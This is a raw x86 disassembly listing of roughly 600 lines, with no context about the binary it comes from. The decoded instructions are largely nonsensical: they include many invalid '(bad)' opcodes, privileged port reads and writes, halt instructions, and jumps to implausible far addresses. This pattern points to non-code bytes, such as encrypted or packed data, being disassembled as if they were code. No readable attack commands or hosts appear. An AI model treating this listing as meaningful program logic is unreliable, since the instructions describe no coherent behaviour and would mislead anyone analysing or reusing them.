  41a499:	retf   0x49c8
  41a49c:	push   eax
  41a49d:	pop    ebp
  41a49e:	xlat   BYTE PTR ds:[ebx]
  41a49f:	fld    QWORD PTR [esp+esi*1+0x78100223]
  41a4a6:	nop
  41a4a7:	pop    esi
  41a4a8:	out    dx,eax
  41a4a9:	aas    
  41a4aa:	jo     0x41a4e9
  41a4ac:	jno    0x41a49f
  41a4ae:	dec    BYTE PTR [ecx-0x17]
  41a4b1:	pop    eax
  41a4b2:	clc    
  41a4b3:	loope  0x41a489
  41a4b5:	and    eax,0x309c6987
  41a4ba:	jae    0x41a4aa
  41a4bc:	les    esi,FWORD PTR [edi-0x22365766]
  41a4c2:	shr    DWORD PTR [edx+0x43835141],0x2b
  41a4c9:	stos   DWORD PTR es:[edi],eax
  41a4ca:	nop
  41a4cb:	addr16 mov esi,0xda788786
  41a4d1:	mov    dh,0x12
  41a4d3:	dec    edx
  41a4d4:	(bad)  
  41a4d5:	in     eax,0xc9
  41a4d7:	jb     0x87e4e495
  41a4dd:	mov    edx,DWORD PTR [eax+0x792424d1]
  41a4e3:	add    ebp,DWORD PTR [edx+0x226720ef]
  41a4e9:	jo     0x41a4b0
  41a4eb:	dec    ecx
  41a4ec:	cmp    DWORD PTR [esi],ecx
  41a4ee:	mov    al,0x19
  41a4f0:	xor    esp,ebp
  41a4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f3:	div    edx
  41a4f5:	mov    edx,0xfa9e185e
  41a4fa:	jmp    0x41a52d
  41a4fc:	lahf   
  41a4fd:	and    al,0xaa
  41a4ff:	dec    edx
  41a500:	push   0xb2d210b7
  41a505:	dec    ebp
  41a506:	push   es
  41a507:	stos   DWORD PTR es:[edi],eax
  41a508:	fwait
  41a509:	and    BYTE PTR [ebx-0x1b],dl
  41a50c:	mov    esi,0x1ce95462
  41a511:	fimul  WORD PTR [esi]
  41a513:	and    cl,cl
  41a515:	dec    edx
  41a516:	ret    
  41a517:	sub    al,0x9d
  41a519:	or     BYTE PTR [eax-0x5740ac6f],dl
  41a51f:	pop    esi
  41a520:	aaa    
  41a521:	dec    esi
  41a522:	popa   
  41a523:	dec    edx
  41a524:	dec    esi
  41a525:	in     al,0x98
  41a527:	ss lahf 
  41a529:	xor    eax,0x617bb12b
  41a52e:	pop    es
  41a52f:	xchg   ebx,eax
  41a530:	(bad)  
  41a531:	inc    ebx
  41a532:	in     eax,0xca
  41a534:	mov    ah,0x87
  41a536:	cmp    DWORD PTR [edi+0x7987f5a3],0x17
  41a53d:	fidivr WORD PTR [eax]
  41a53f:	aad    0x76
  41a541:	test   DWORD PTR ds:0x1f428a1,edx
  41a547:	xor    ebx,DWORD PTR [ebx+0x5ff74dee]
  41a54d:	mov    ah,0x58
  41a54f:	dec    esi
  41a550:	stos   BYTE PTR es:[edi],al
  41a551:	sbb    BYTE PTR [ebp+ecx*4-0x29],dh
  41a555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a557:	push   ds
  41a558:	sub    esi,ebx
  41a55a:	push   edi
  41a55b:	scas   eax,DWORD PTR es:[edi]
  41a55c:	push   eax
  41a55d:	cmp    BYTE PTR [edi],cl
  41a55f:	push   edx
  41a560:	pushf  
  41a561:	adc    esi,DWORD PTR [edi]
  41a563:	cdq    
  41a564:	mov    DWORD PTR [ebp-0x368c9777],ebp
  41a56a:	test   DWORD PTR [edx-0x49],ecx
  41a56d:	xor    BYTE PTR [eax+0x6b99981f],bh
  41a573:	mov    ds:0xce19789b,eax
  41a578:	jmp    0xd8639da7
  41a57d:	(bad)  [esi]
  41a57f:	outs   dx,BYTE PTR ds:[esi]
  41a580:	sbb    DWORD PTR [edi+0x2e],ecx
  41a583:	dec    edi
  41a584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a585:	mov    dl,BYTE PTR [ecx-0x472021bb]
  41a58b:	ss pop ss
  41a58d:	dec    eax
  41a58e:	dec    BYTE PTR [ebx]
  41a590:	sti    
  41a591:	or     eax,0x32badf3
  41a596:	ficomp DWORD PTR [edi-0x73521f5e]
  41a59c:	rol    dl,1
  41a59e:	ret    0x3531
  41a5a1:	mov    esi,0xde761ebd
  41a5a6:	fcmovne st,st(5)
  41a5a8:	rcr    DWORD PTR [ecx+ebp*4-0x34],cl
  41a5ac:	imul   ebx,DWORD PTR gs:[edi-0x43f7777],0x4e
  41a5b4:	push   ecx
  41a5b5:	fwait
  41a5b6:	push   eax
  41a5b7:	sbb    DWORD PTR [esi-0x2b],0xa55757f2
  41a5be:	add    BYTE PTR [ebp-0x45],dh
  41a5c1:	add    eax,0xfe4a293a
  41a5c6:	pop    esi
  41a5c8:	loop   0x41a587
  41a5ca:	fwait
  41a5cb:	xor    eax,0x793df73a
  41a5d0:	cmp    esi,ecx
  41a5d2:	add    cl,dh
  41a5d4:	fwait
  41a5d5:	and    bh,BYTE PTR [ebx-0x2f9a6dd5]
  41a5db:	popa   
  41a5dc:	pop    esi
  41a5dd:	fidiv  WORD PTR [ebx+ebp*8]
  41a5e0:	lea    edi,[ebp+0x3f65871d]
  41a5e6:	nop
  41a5e7:	popf   
  41a5e8:	sub    eax,0xa3200301
  41a5ed:	ror    BYTE PTR [edx],cl
  41a5ef:	dec    esi
  41a5f0:	pop    ecx
  41a5f1:	es stos DWORD PTR es:[edi],eax
  41a5f3:	or     esi,DWORD PTR [ebx]
  41a5f5:	pop    esi
  41a5f6:	rcl    DWORD PTR [esp+ecx*2-0x5cb7008],cl
  41a5fd:	jno    0x41a5cb
  41a5ff:	fisttp DWORD PTR [ebp+0x4884cbc1]
  41a605:	imul   edx,DWORD PTR [eax],0xb62fc5c8
  41a60b:	and    DWORD PTR [ebx-0x46],ebp
  41a60e:	retf   0xf650
  41a611:	pop    ebp
  41a612:	pop    ebx
  41a613:	jnp    0x41a673
  41a615:	sbb    al,0x1e
  41a617:	pop    eax
  41a618:	add    ebx,esi
  41a61a:	mov    BYTE PTR [esi],bl
  41a61c:	rol    DWORD PTR [esi],cl
  41a61e:	scas   al,BYTE PTR es:[edi]
  41a61f:	or     eax,0x5adc90bf
  41a624:	jmp    0xd095:0x99fa77dd
  41a62b:	adc    BYTE PTR [ebx+0x54],dl
  41a62e:	dec    edx
  41a62f:	push   ecx
  41a630:	xchg   esi,eax
  41a631:	mov    bh,0xf5
  41a633:	cmp    BYTE PTR [edi],0xee
  41a636:	repnz dec ebp
  41a638:	xor    BYTE PTR [ebp-0x70],dh
  41a63b:	xchg   ecx,eax
  41a63c:	and    cl,BYTE PTR [eax-0x48]
  41a63f:	mov    edx,0x579ad88b
  41a644:	aad    0x28
  41a646:	jnp    0x41a5d2
  41a648:	or     BYTE PTR [esi],0x74
  41a64b:	inc    ecx
  41a64c:	jmp    0x9053:0x777e597d
  41a653:	mov    ah,0xd9
  41a655:	inc    eax
  41a656:	hlt    
  41a657:	cmp    ebp,DWORD PTR [eax]
  41a659:	test   BYTE PTR [ebp+0x4a],cl
  41a65c:	jno    0x41a641
  41a65e:	jp     0x41a6d1
  41a660:	xchg   esp,eax
  41a661:	push   0x7b9bf2d7
  41a666:	enter  0x4351,0x3e
  41a66a:	test   al,0xe0
  41a66c:	dec    edx
  41a66d:	fiadd  WORD PTR [edx]
  41a66f:	xor    al,0x3
  41a671:	add    al,0xd
  41a673:	leave  
  41a674:	xor    DWORD PTR [edi-0x7c],eax
  41a677:	adc    eax,0x4a56d9d4
  41a67c:	mov    eax,0xa71d3a7
  41a681:	aas    
  41a682:	adc    DWORD PTR [edx-0x7f],ecx
  41a685:	or     eax,0xd23c079b
  41a68a:	loope  0x41a655
  41a68c:	mov    dl,0xd6
  41a68e:	out    dx,al
  41a68f:	fcomp  DWORD PTR [ebx+0x6166f2f4]
  41a695:	xor    esp,esi
  41a697:	dec    ecx
  41a698:	cmc    
  41a699:	shl    BYTE PTR [edi+0x7aefd88e],0xb1
  41a6a0:	pop    ss
  41a6a1:	jle    0x41a633
  41a6a3:	and    bh,BYTE PTR [ecx+0x54]
  41a6a6:	mov    WORD PTR [edx],cs
  41a6a8:	jnp    0x41a66d
  41a6aa:	push   ds
  41a6ab:	dec    edx
  41a6ac:	das    
  41a6ad:	and    DWORD PTR [esi+0x2cb054c0],0x25
  41a6b4:	fwait
  41a6b5:	js     0x41a71f
  41a6b7:	adc    al,0x19
  41a6b9:	stos   DWORD PTR es:[edi],eax
  41a6ba:	sub    DWORD PTR [ebx-0x7f],0xffffffe1
  41a6be:	mov    edi,0x43e28d9e
  41a6c3:	adc    eax,0x9e47567b
  41a6c8:	fwait
  41a6c9:	out    0x27,eax
  41a6cb:	pop    ds
  41a6cc:	call   0xed1d6328
  41a6d1:	fstp   QWORD PTR [eax]
  41a6d3:	bound  edi,QWORD PTR [ebp+0x79]
  41a6d6:	out    dx,al
  41a6d7:	and    ebx,0xd
  41a6da:	nop
  41a6db:	ficom  DWORD PTR [ebp+0xcbbf005]
  41a6e1:	xchg   DWORD PTR [ecx+0x4a],esi
  41a6e4:	call   0xa315e8ef
  41a6e9:	mov    edi,0xd20dc73f
  41a6ee:	test   ch,ah
  41a6f0:	fwait
  41a6f1:	xchg   ebx,eax
  41a6f2:	(bad)  
  41a6f3:	out    dx,eax
  41a6f4:	sbb    eax,0xfe136556
  41a6f9:	frstor [edx-0x725f7826]
  41a6ff:	cmp    edi,DWORD PTR [ecx+edx*1+0x48]
  41a703:	int3   
  41a704:	fwait
  41a705:	inc    edi
  41a706:	data16 mov bh,0xcf
  41a709:	lods   eax,DWORD PTR ds:[esi]
  41a70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a70b:	mov    eax,ds:0x2707dff7
  41a710:	dec    ebx
  41a711:	les    edi,FWORD PTR [esi+0x44]
  41a714:	jnp    0x41a6f7
  41a716:	nop
  41a717:	loope  0x41a6b9
  41a719:	mov    WORD PTR [esi],cs
  41a71b:	rol    BYTE PTR [edi-0x54],1
  41a71e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a71f:	cmc    
  41a720:	jne    0x41a700
  41a722:	ret    
  41a723:	aad    0xbf
  41a725:	addr16 sub al,0x11
  41a728:	mov    dh,0xf1
  41a72a:	and    cl,BYTE PTR [ecx-0x4a508e7b]
  41a730:	mov    al,ds:0xc1f28d9d
  41a735:	mov    edx,0x79becea
  41a73a:	das    
  41a73b:	mov    ah,0xcd
  41a73d:	imul   BYTE PTR [edx]
  41a73f:	mov    BYTE PTR [ebx-0x22],ah
  41a742:	dec    edi
  41a743:	(bad)  
  41a744:	shl    eax,cl
  41a746:	add    al,0x5b
  41a748:	sbb    eax,0xeb6c01db
  41a74d:	jp     0x41a79a
  41a74f:	push   eax
  41a750:	mov    bh,0x14
  41a752:	or     ebp,ebx
  41a754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a755:	mov    edx,0xcedd4a08
  41a75a:	and    BYTE PTR [edi+0x3c51ddff],al
  41a760:	out    0x30,al
  41a762:	call   0x904d67d8
  41a767:	jb     0x41a721
  41a769:	hlt    
  41a76a:	dec    ebp
  41a76b:	enter  0xc9f2,0x13
  41a76f:	dec    edx
  41a770:	jg     0x41a78a
  41a772:	inc    edi
  41a773:	push   cs
  41a774:	sub    eax,0x9ba48133
  41a779:	imul   ebx,DWORD PTR [ebx+0x2dcea8c],0xe7e05897
  41a783:	int    0xd0
  41a785:	cmp    eax,0xce03e5d1
  41a78a:	(bad)  
  41a78b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a78c:	fwait
  41a78d:	iret   
  41a78e:	ins    DWORD PTR es:[edi],dx
  41a78f:	loopne 0x41a73b
  41a791:	xor    ecx,DWORD PTR [ebx-0x59]
  41a794:	scas   eax,DWORD PTR es:[edi]
  41a795:	cld    
  41a796:	push   es
  41a797:	dec    esi
  41a798:	retf   
  41a799:	adc    ebp,DWORD PTR fs:[eax]
  41a79c:	nop
  41a79d:	jle    0x41a7a0
  41a79f:	inc    esp
  41a7a0:	push   ebx
  41a7a1:	hlt    
  41a7a2:	popf   
  41a7a3:	outs   dx,BYTE PTR ds:[esi]
  41a7a4:	mov    edi,0x7572fbc5
  41a7a9:	pop    esi
  41a7aa:	adc    edx,DWORD PTR [ebx]
  41a7ac:	lock inc eax
  41a7ae:	outs   dx,DWORD PTR ds:[esi]
  41a7af:	test   BYTE PTR [esi],bh
  41a7b1:	test   BYTE PTR [ebx-0x40af37e2],dl
  41a7b7:	adc    BYTE PTR [ebx-0x6400f0e6],al
  41a7bd:	pop    ss
  41a7be:	push   ecx
  41a7bf:	clc    
  41a7c0:	pusha  
  41a7c1:	xor    al,0x71
  41a7c3:	xchg   ebp,eax
  41a7c4:	jo     0x41a7b6
  41a7c6:	and    eax,0xf4ebaab4
  41a7cb:	xchg   ecx,eax
  41a7cc:	cmp    al,0x5
  41a7ce:	test   BYTE PTR ds:0x76189e6c,dl
  41a7d4:	fdiv   st,st(2)
  41a7d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7d8:	sub    eax,0x3242c5d4
  41a7dd:	loope  0x41a85d
  41a7df:	cmp    eax,0x8538109e
  41a7e4:	jnp    0x41a860
  41a7e6:	ds scas eax,DWORD PTR es:[edi]
  41a7e8:	fwait
  41a7e9:	test   DWORD PTR [edi],0xc111fc16
  41a7ef:	pop    ebp
  41a7f0:	or     eax,0xbe517f52
  41a7f5:	adc    al,0xd
  41a7f7:	xchg   DWORD PTR cs:[esi-0x5c93ddd2],ebp
  41a7fe:	jl     0x41a78a
  41a800:	fwait
  41a801:	and    DWORD PTR [edx+eax*2-0x3c3342f9],0x1a
  41a809:	fdivrp st(6),st
  41a80b:	mov    al,ds:0x8dbb1aee
  41a810:	in     al,0x75
  41a812:	xchg   ebx,eax
  41a813:	(bad)  
  41a814:	scas   eax,DWORD PTR es:[edi]
  41a815:	in     al,0x23
  41a817:	popa   
  41a818:	rcr    DWORD PTR [ebp-0x1a6f02aa],0x80
  41a81f:	stc    
  41a820:	mov    ecx,0x8f1a2e1e
  41a825:	out    0xd2,eax
  41a827:	dec    ebp
  41a828:	fwait
  41a829:	mov    ebp,0x105c0edf
  41a82e:	add    dl,BYTE PTR [esp+eax*8-0x5fb3083f]
  41a835:	mov    ds:0x10f7431a,eax
  41a83a:	js     0x41a830
  41a83c:	mov    ah,0x8a
  41a83e:	nop
  41a83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a840:	dec    ebx
  41a841:	sbb    cl,BYTE PTR [ecx]
  41a843:	std    
  41a844:	push   ds
  41a845:	btc    DWORD PTR [ecx+0x7f],ecx
  41a849:	lea    ecx,[ebp+ebp*8-0x2e]
  41a84d:	dec    edx
  41a84e:	in     al,0x88
  41a850:	fwait
  41a851:	scas   eax,DWORD PTR es:[edi]
  41a852:	push   0x5c
  41a854:	push   ebx
  41a855:	dec    edi
  41a856:	mov    BYTE PTR ss:[edx+0x7d454fe1],0x51
  41a85e:	xchg   edi,eax
  41a85f:	cmp    DWORD PTR [edx],0xdca43b2
  41a865:	inc    ebx
  41a866:	sub    DWORD PTR [esi-0x65],edx
  41a869:	push   es
  41a86a:	jns    0x41a837
  41a86c:	pop    eax
  41a86d:	pop    ebx
  41a86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a86f:	pushf  
  41a870:	push   ss
  41a871:	fdivp  st(3),st
  41a873:	in     eax,dx
  41a874:	cli    
  41a875:	mov    ecx,0x37326955
  41a87a:	int3   
  41a87b:	dec    ebx
  41a87c:	sahf   
  41a87d:	in     al,0x24
  41a87f:	pop    es
  41a880:	jmp    0x3d0c16fe
  41a885:	sub    ah,BYTE PTR [ebp+eax*2-0x70]
  41a889:	fmulp  st(0),st
  41a88b:	mov    ebp,0x881262b2
  41a890:	out    dx,al
  41a891:	ficom  DWORD PTR [eax-0x60bb324c]
  41a897:	(bad)  
  41a898:	dec    BYTE PTR [ebp-0x1b]
  41a89b:	dec    ecx
  41a89c:	mov    edi,DWORD PTR [ebx+edx*2+0x28f9a373]
  41a8a3:	mov    al,ds:0x7fd2569b
  41a8a8:	ret    0x5679
  41a8ab:	push   esp
  41a8ac:	int3   
  41a8ad:	fucomp st(0)
  41a8af:	(bad)  
  41a8b1:	call   0x54de80cc
  41a8b6:	nop
  41a8b7:	adc    ebp,DWORD PTR [eax+0x14]
  41a8ba:	xor    esp,esp
  41a8bc:	mov    ah,BYTE PTR [ebx-0x218a1db5]
  41a8c2:	repnz mov al,ds:0x227fe7ac
  41a8c8:	mov    edx,0x718290c5
  41a8cd:	jge    0x41a8db
  41a8cf:	sub    al,0xf7
  41a8d1:	mov    es,WORD PTR [eax+edi*2+0x4e077828]
  41a8d8:	mov    ?,WORD PTR ds:0x94552a8f
  41a8de:	sahf   
  41a8df:	enter  0xee1c,0x94
  41a8e3:	test   eax,0x624e6365
  41a8e8:	cmp    al,0x5d
  41a8ea:	scas   eax,DWORD PTR es:[edi]
  41a8eb:	dec    ecx
  41a8ec:	mov    cl,0xc8
  41a8ee:	dec    edi
  41a8ef:	ret    0xcb09
  41a8f2:	imul   edx,DWORD PTR [ebx+0x11d5509b],0xab2be1ef
  41a8fc:	out    dx,al
  41a8fd:	fisttp QWORD PTR [edx-0x628cd23d]
  41a903:	dec    ebx
  41a904:	mov    ah,0x4a
  41a906:	nop
  41a907:	pop    edx
  41a908:	(bad)  
  41a909:	popa   
  41a90a:	call   0x19e0ea64
  41a90f:	dec    ebx
  41a910:	jmp    0x41a959
  41a912:	inc    edx
  41a913:	xchg   esp,eax
  41a914:	sar    BYTE PTR [ecx+0x582525b9],0x90
  41a91b:	jp     0x41a937
  41a91d:	push   esi
  41a91e:	jmp    0xfb60:0xd73ece9e
  41a925:	das    
  41a926:	mov    ebx,0x54d6f64b
  41a92b:	pop    ecx
  41a92c:	cld    
  41a92d:	fidiv  DWORD PTR [ebx+0x60f2109]
  41a933:	addr16 fwait
  41a935:	push   es
  41a936:	and    bl,BYTE PTR [eax-0x55]
  41a939:	test   eax,0xddf95aae
  41a93e:	push   ebx
  41a93f:	push   edx
  41a940:	mov    ah,0x22
  41a942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a943:	into   
  41a944:	or     al,0x95
  41a946:	leave  
  41a947:	cmp    ecx,eax
  41a949:	(bad)  [ebx]
  41a94b:	leave  
  41a94c:	dec    esi
  41a94d:	imul   ebp,DWORD PTR [edx-0x4e],0x6499de4a
  41a954:	or     bh,BYTE PTR [ebx]
  41a956:	pop    eax
  41a957:	mov    al,BYTE PTR [ecx+ebx*4+0x2a08a890]
  41a95e:	pop    edx
  41a95f:	push   eax
  41a960:	xor    al,0x70
  41a962:	or     DWORD PTR [ebx-0x74],ecx
  41a965:	xor    bh,cl
  41a967:	repnz shl BYTE PTR [edi+0x39c7a9e7],0x90
  41a96f:	ja     0x41a93b
  41a971:	std    
  41a972:	pop    ebp
  41a973:	mov    ecx,0x82e56314
  41a978:	pop    esi
  41a979:	retf   0xd911
  41a97c:	out    dx,al
  41a97d:	sbb    DWORD PTR [ebx+0x2e],0xffffffc8
  41a981:	mov    esi,0xc6e069f0
  41a986:	xchg   edx,eax
  41a987:	inc    esp
  41a988:	daa    
  41a989:	loopne 0x41a90e
  41a98b:	mov    ds:0x437c5fd0,eax
  41a990:	push   esi
  41a991:	into   
  41a992:	push   0x4a
  41a994:	pop    ebx
  41a995:	nop
  41a996:	out    0x5c,eax
  41a998:	gs ins DWORD PTR es:[edi],dx
  41a99a:	xchg   edx,eax
  41a99b:	push   edi
  41a99c:	fwait
  41a99d:	jl     0x41a95d
  41a99f:	outs   dx,DWORD PTR ds:[esi]
  41a9a0:	pusha  
  41a9a1:	(bad)  
  41a9a3:	push   es
  41a9a4:	mov    eax,0x2d69a0dd
  41a9a9:	arpl   bp,ax
  41a9ab:	out    dx,eax
  41a9ac:	and    al,0x64
  41a9ae:	nop
  41a9af:	(bad)  [edx+0x5b16ba6]
  41a9b5:	movups xmm1,xmm0
  41a9b8:	mov    ecx,0xd8c0a8dd
  41a9bd:	push   ecx
  41a9bf:	jge    0x41a9cb
  41a9c1:	retf   0x1b9e
  41a9c4:	(bad)  
  41a9c5:	fs daa 
  41a9c7:	stos   BYTE PTR es:[edi],al
  41a9c8:	aaa    
  41a9c9:	xchg   esp,eax
  41a9ca:	jb     0x41a9de
  41a9cc:	mov    al,ds:0x1ffe9c1b
  41a9d1:	rol    BYTE PTR [edi-0x8a19352],1
  41a9d7:	mov    ch,0x55
  41a9d9:	xchg   ecx,eax
  41a9da:	nop
  41a9db:	xlat   BYTE PTR ds:[ebx]
  41a9dc:	test   DWORD PTR [edx+0x18],ebp
  41a9df:	idiv   DWORD PTR [edx]
  41a9e1:	clc    
  41a9e2:	lock dec edx
  41a9e4:	stos   DWORD PTR es:[edi],eax
  41a9e5:	pop    es
  41a9e6:	pop    ecx
  41a9e7:	push   cs
  41a9e8:	mov    eax,ds:0xe039e20b
  41a9ed:	inc    esp
  41a9ee:	xchg   bh,al
  41a9f0:	pushf  
  41a9f1:	lds    ecx,FWORD PTR [ebx+0x28]
  41a9f4:	pop    ecx
  41a9f5:	(bad)  
  41a9f6:	cmp    al,0xb0
  41a9f8:	sti    
  41a9f9:	mov    ecx,0xcb6c4a17
  41a9fe:	loope  0x41a98f
  41aa00:	xchg   esp,eax
  41aa01:	in     al,0xfb
  41aa03:	clc    
  41aa04:	sahf   
  41aa05:	or     BYTE PTR [eax],bh
  41aa07:	sbb    BYTE PTR [eax],ch
  41aa09:	ja     0x41a9a2
  41aa0b:	sub    DWORD PTR [eax+edi*4+0x814499f],ebp
  41aa12:	push   ecx
  41aa13:	std    
  41aa14:	push   ss
  41aa15:	add    BYTE PTR [esi+0x4161375],ah
  41aa1b:	in     eax,0x33
  41aa1d:	adc    eax,0x39835990
  41aa22:	xchg   ebp,eax
  41aa23:	int3   
  41aa24:	shr    DWORD PTR [eax-0x3d],1
  41aa27:	dec    ecx
  41aa28:	push   esp
  41aa29:	pop    ebx
  41aa2a:	cwde   
  41aa2b:	dec    edi
  41aa2c:	inc    esi
  41aa2d:	pop    ss
  41aa2e:	jp     0x41a9d0
  41aa30:	fwait
  41aa31:	push   ebx
  41aa32:	push   0xe44c5ee9
  41aa37:	push   edx
  41aa38:	or     eax,0x45d0ecde
  41aa3d:	push   esi
  41aa3e:	stos   DWORD PTR es:[edi],eax
  41aa3f:	xchg   edi,eax
  41aa40:	mov    bh,0x88
  41aa42:	or     al,0x5b
  41aa44:	fwait
  41aa45:	ins    BYTE PTR es:[edi],dx
  41aa46:	cs push ds
  41aa48:	add    DWORD PTR [eax+0xdc39b11],ebp
  41aa4e:	jp     0x41aa3b
  41aa50:	test   eax,0x9bfa673a
  41aa55:	xor    al,0xcd
  41aa57:	ds pop ds
  41aa59:	fwait
  41aa5a:	pusha  
  41aa5b:	mov    ebp,DWORD PTR ds:0x7cf14fde
  41aa61:	mov    WORD PTR ds:0xdccf8256,?
  41aa67:	mov    edi,0x6c9057e7
  41aa6c:	(bad)  
  41aa6d:	in     al,dx
  41aa6e:	lea    eax,[ebx]
  41aa70:	(bad)  
  41aa71:	shl    DWORD PTR [ebp+0x4a],cl
  41aa74:	jmp    0x41aad5
  41aa76:	pop    ecx
  41aa77:	add    BYTE PTR [ebx+0x51],ch
  41aa7a:	xchg   ebx,eax
  41aa7b:	dec    edi
  41aa7c:	pushf  
  41aa7d:	xor    ebp,DWORD PTR [ebx+ecx*4+0x37b37ec8]
  41aa84:	jnp    0x41aa4b
  41aa86:	adc    ecx,DWORD PTR [edx+0x78]
  41aa89:	repnz xchg ecx,eax
  41aa8b:	and    ch,ch
  41aa8d:	or     al,0xda
  41aa8f:	pop    ds
  41aa90:	(bad)  
  41aa91:	inc    eax
  41aa92:	dec    ebx
  41aa93:	dec    edx
  41aa94:	inc    ecx
  41aa95:	jmp    0x133b6bec
  41aa9a:	cmp    cl,BYTE PTR [edx-0x39]
  41aa9d:	fisttp DWORD PTR [esp+ecx*1+0x425fb7d5]
  41aaa4:	fwait
  41aaa5:	popf   
  41aaa6:	xor    ecx,DWORD PTR es:[eax-0x31]
  41aaaa:	push   ebx
  41aaab:	mov    esi,0x6d7b1b79
  41aab0:	sbb    al,0x4a
  41aab2:	add    ebx,esp
  41aab4:	inc    edi
  41aab5:	fidivr DWORD PTR [eax-0x6fcbaccb]
  41aabb:	and    edx,DWORD PTR ds:0x6f010cfd
  41aac1:	fdiv   QWORD PTR [ebx+0x4d]
  41aac4:	jl     0x41aae0
  41aac6:	push   eax
  41aac7:	sahf   
  41aac8:	xchg   edx,eax
  41aac9:	xchg   edi,eax
  41aaca:	sbb    BYTE PTR [edi+0x6690a597],dl
  41aad0:	fistp  DWORD PTR [eax+0x79]
  41aad3:	xlat   BYTE PTR ds:[ebx]
  41aad4:	lds    esp,FWORD PTR [esi+0x3d]
  41aad7:	cmp    bx,WORD PTR [edi-0x516e686b]
  41aade:	jo     0x41aac5
  41aae0:	and    dl,BYTE PTR [edx+0x73]
  41aae3:	into   
  41aae4:	test   eax,0xd555a6a0
  41aae9:	cmp    eax,0x89870fdf
  41aaee:	sbb    BYTE PTR [edx+0xc],cl
  41aaf1:	sbb    eax,0xa8ca1a3e
  41aaf6:	cld    
  41aaf7:	push   edx
  41aaf8:	jge    0x41ab00
  41aafa:	xchg   ecx,eax
  41aafb:	aas    
  41aafc:	add    esi,DWORD PTR [edi+0xd]
  41aaff:	les    esi,FWORD PTR [eax]
  41ab01:	push   esp
  41ab02:	rcl    bh,0x71
  41ab05:	push   edx
  41ab06:	pop    ebp
  41ab07:	dec    edx
  41ab08:	aaa    
  41ab09:	repz mov ch,0xe3
  41ab0c:	ins    DWORD PTR es:[edi],dx
  41ab0d:	push   ebx
  41ab0e:	add    al,0x32
  41ab10:	mov    ds:0x4021ff54,al
  41ab15:	scas   al,BYTE PTR es:[edi]
  41ab16:	pusha  
  41ab17:	sub    eax,0x688e3e50
  41ab1c:	out    0x1b,al
  41ab1e:	cmp    ebp,ecx
  41ab20:	push   ecx
  41ab21:	jo     0x41aad1
  41ab23:	out    0xa5,eax
  41ab25:	pop    ecx
  41ab26:	adc    DWORD PTR [eax+0x3d],esp
  41ab29:	lea    edx,[eax-0x1ff284a]
  41ab2f:	lods   al,BYTE PTR ds:[esi]
  41ab30:	sahf   
  41ab31:	fisttp QWORD PTR [eax-0x6efa049b]
  41ab37:	mov    edx,0x419072c4
  41ab3c:	and    eax,0x62be35b7
  41ab41:	mov    ebp,0x20a4a62
  41ab46:	popf   
  41ab47:	sar    BYTE PTR [edi+0x6f],1
  41ab4a:	daa    
  41ab4b:	out    0xb1,al
  41ab4d:	inc    edx
  41ab4e:	aam    0x26
  41ab50:	sahf   
  41ab51:	imul   edi,DWORD PTR [eax],0x64
  41ab54:	in     al,dx
  41ab55:	test   DWORD PTR [eax-0x251a6944],esi
  41ab5b:	sbb    DWORD PTR [eax],ecx
  41ab5d:	push   ebp
  41ab5e:	jo     0x41abba
  41ab60:	stc    
  41ab61:	mov    ebx,0x7d9b36af
  41ab66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab67:	scas   al,BYTE PTR es:[edi]
  41ab68:	icebp  
  41ab69:	mov    ds:0xddb958a4,eax
  41ab6e:	fdiv   DWORD PTR [ebp-0x7d]
  41ab71:	bound  eax,QWORD PTR [edi]
  41ab73:	add    eax,0x6b90256f
  41ab78:	(bad)  
  41ab79:	xchg   ebp,eax
  41ab7a:	cli    
  41ab7b:	and    al,0x9f
  41ab7d:	push   ebp
  41ab7e:	enter  0x2e49,0xf7
  41ab82:	cmp    DWORD PTR [ebp+esi*4-0x63a7a0e0],esp
  41ab89:	dec    edi
  41ab8a:	stos   DWORD PTR es:[edi],eax
  41ab8b:	outs   dx,DWORD PTR ds:[esi]
  41ab8c:	sub    cl,BYTE PTR [ebx-0x669c49d4]
  41ab92:	lods   al,BYTE PTR ds:[esi]
  41ab93:	dec    ecx
  41ab94:	mov    eax,ds:0x912b38d9
  41ab99:	pop    edi
  41ab9a:	mov    bh,0x26
  41ab9c:	mov    edx,0x9bcc9b6a
  41aba1:	cmp    bl,BYTE PTR [ebx]
  41aba3:	stos   DWORD PTR es:[edi],eax
  41aba4:	push   0x10
  41aba6:	push   0xffffffc1
  41aba8:	aam    0x18
  41abaa:	jg     0x41ab8f
  41abac:	fwait
  41abad:	loope  0x41abd9
  41abaf:	test   DWORD PTR [ebp-0x4864406f],eax
  41abb5:	(bad)  
  41abb6:	jbe    0x41ab94
  41abb8:	sbb    esi,ebx
  41abba:	lods   eax,DWORD PTR ds:[esi]
  41abbb:	idiv   BYTE PTR [ecx+0x9]
  41abbe:	xchg   ebp,eax
  41abbf:	dec    ecx
  41abc0:	add    DWORD PTR [eax-0x7d],ebx
  41abc3:	aas    
  41abc4:	jmp    0x9c848777
  41abc9:	or     dl,BYTE PTR [edx-0x69]
  41abcc:	test   DWORD PTR [ebp+0x2d],edi
  41abcf:	call   0x4b872047
  41abd4:	in     al,0x9a
  41abd6:	icebp  
  41abd7:	loope  0x41abd4
  41abd9:	retf   0x2e19
  41abdc:	imul   eax,edi,0xffffff90
  41abdf:	inc    eax
  41abe0:	addr16 sbb eax,0x44c27921
  41abe6:	adc    DWORD PTR [ebx+0x292addc8],edi
  41abec:	lea    ebx,[edx]
  41abee:	inc    ebp
  41abef:	adc    dl,BYTE PTR [edi-0x1b636ef6]
  41abf5:	push   ebx
  41abf6:	outs   dx,BYTE PTR ds:[esi]
  41abf7:	mov    ah,0x42
  41abf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
